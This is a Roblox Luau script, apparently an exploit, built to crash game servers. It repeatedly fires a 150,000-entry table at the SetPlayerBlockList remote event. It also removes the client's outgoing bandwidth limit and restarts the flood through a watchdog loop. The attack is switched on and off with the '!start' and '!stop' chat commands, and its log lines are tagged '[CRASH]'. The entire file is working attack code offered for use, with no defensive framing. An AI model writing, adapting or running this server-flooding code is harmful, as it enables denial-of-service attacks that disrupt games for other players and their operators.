--!nonstrict
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

local player = Players.LocalPlayer

-- ═══════════ CONFIG ═══════════
local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1.5
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false
local Format         = "pair"
-- ══════════════════════════════

local RemoteCandidates = {
    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
    { "ReplicatedStorage",       "SetPlayerBlockList" },
}

local state = {
    running = false,
    cache = nil,
    remote = nil,
    fires = 0,
    errors = 0,
    lastFire = 0,
}

local function log(msg)
    print("[CRASH] " .. tostring(msg))
end

local function resolve()
    for _, path in ipairs(RemoteCandidates) do
        local node, ok = game, true
        for i = 1, #path do
            local nxt = node:FindFirstChild(path[i])
            if not nxt then ok = false; break end
            node = nxt
        end
        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
            return node
        end
    end
    return nil
end

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

local function build()
    local n = Children
    local root = table.create(n)

    if Format == "flat" then
        for i = 1, n do root[i] = i end
        return root
    end
    if Format == "compact" then
        for i = 1, n do root[i] = { i, i * 2 } end
        return root
    end

    local pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
    for i = 1, n do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

-- ═══════════ FIRE LOOP (can't die) ═══════════
local function fireLoop()
    if not state.cache then
        state.cache = build()
    end

    while state.running do
        local ok, err = pcall(function()
            if not state.remote then
                state.remote = resolve()
            end

            if not state.remote then
                error("remote not found", 0)
            end

            for _ = 1, FireBurst do
                state.remote:FireServer(state.cache)
            end
        end)

        if ok then
            state.fires += 1
            state.lastFire = tick()
            state.errors = 0
        else
            state.errors += 1
            state.remote = nil
        end

        task.wait(FrameDelay)
    end
end

-- ═══════════ WATCHDOG — restarts loop if it dies ═══════════
task.spawn(function()
    while true do
        task.wait(2)
        if state.running and (tick() - state.lastFire) > 5 then
            log("watchdog: loop stalled, restarting")
            state.lastFire = tick()
            task.spawn(fireLoop)
        end
    end
end)

-- ═══════════ TELEMETRY — shows if it's alive ═══════════
task.spawn(function()
    local lastFires = 0
    while true do
        task.wait(10)
        if state.running then
            local delta = state.fires - lastFires
            lastFires = state.fires
            log(string.format(
                "alive | fires=%d (+%d/10s) | errors=%d | remote=%s",
                state.fires, delta, state.errors,
                state.remote and "yes" or "NO"
            ))
        else
            lastFires = state.fires
        end
    end
end)

-- ═══════════ START / STOP ═══════════
local function start()
    if state.running then return end
    state.running = true
    state.fires = 0
    state.errors = 0
    state.lastFire = tick()
    state.remote = nil
    state.cache = nil
    log("started")
    task.spawn(fireLoop)
end

local function stop()
    if not state.running then return end
    state.running = false
    state.cache = nil
    state.remote = nil
    log("stopped")
end

-- ═══════════ CHAT COMMANDS ═══════════
local started = false

local function onMessage(msg)
    local m = tostring(msg or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
    if m == "!start" then
        if not started then
            started = true
            pcall(start)
        end
    elseif m == "!stop" then
        if started then
            started = false
            pcall(stop)
        end
    end
end

pcall(function() player.Chatted:Connect(onMessage) end)

pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        if not message.TextSource then return end
        if message.TextSource.UserId ~= player.UserId then return end
        onMessage(message.Text)
    end)
end)
